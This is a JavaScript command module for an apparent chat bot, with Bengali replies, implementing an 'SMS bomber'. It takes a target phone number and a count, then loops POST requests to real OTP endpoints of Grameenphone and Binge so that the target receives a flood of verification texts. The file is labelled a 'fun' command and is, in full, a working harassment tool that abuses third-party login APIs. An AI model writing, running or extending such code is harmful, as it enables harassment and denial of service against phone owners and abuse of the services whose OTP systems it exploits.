const axios = require("axios");

module.exports = {
  config: {
    name: "bomb",
    aliases: ["smsbomb"],
    version: "1.0",
    author: "YourName",
    countDown: 5,
    role: 0,
    shortDescription: "Send sms bomber",
    longDescription: "Send multiple SMS using bomber API",
    category: "fun",
    guide: "{p}bomb <number> <amount>"
  },

  onStart: async function ({ args, message }) {
    if (args.length < 2) {
      return message.reply("❌ ব্যবহার: .bomb <number> <amount>");
    }

    let number = args[0];
    let amount = parseInt(args[1]);

    if (isNaN(amount) || amount <= 0) {
      return message.reply("❌ Amount সঠিক দাও");
    }

    message.reply(`🚀 Bombing শুরু হলো! Target: ${number}, Amount: ${amount}`);

    // Example API List
    const APIS = [
      {
        url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: number, email: "", language: "en" })
      },
      {
        url: "https://ss.binge.buzz/otp/send/login",
        method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        body: `phone=${number}`
      }
    ];

    let sent = 0;
    for (let i = 0; i < amount; i++) {
      for (let api of APIS) {
        try {
          await axios({
            method: api.method,
            url: api.url,
            headers: api.headers,
            data: api.body
          });
          sent++;
        } catch (e) {
          console.log("Error sending:", e.message);
        }
      }
    }

    message.reply(`✅ Bombing শেষ! মোট চেষ্টা করা হয়েছে: ${sent} বার`);
  }
};
